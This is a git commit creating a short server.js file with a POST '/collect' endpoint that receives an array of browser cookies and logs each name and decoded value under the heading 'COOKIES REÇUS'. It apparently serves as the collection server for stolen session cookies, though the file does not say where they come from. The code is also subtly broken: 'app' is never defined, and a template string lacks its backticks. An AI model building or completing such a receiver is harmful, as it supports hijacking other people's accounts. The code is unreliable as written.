4fae4a07e784f238077d2d816262bb0ab989c19c
venonlohan5-hue <venonlohan5@gmail.com>
2026-05-08 02:44:50 +0200

    Create server.js

---
+++ server.js
@@ -0,0 +1,18 @@
+app.post("/collect", (req, res) => {
+  const cookies = req.body.cookies;
+
+  console.log("\n===== COOKIES REÇUS =====\n");
+
+  if (!Array.isArray(cookies)) {
+    console.log("❌ cookies n'est pas un tableau !");
+    return res.json({ status: "error" });
+  }
+
+  cookies.forEach(cookie => {
+    console.log(${cookie.name}:${decodeURIComponent(cookie.value)});
+  });
+
+  console.log("\n=========================\n");
+
+  res.json({ status: "ok" });
+});
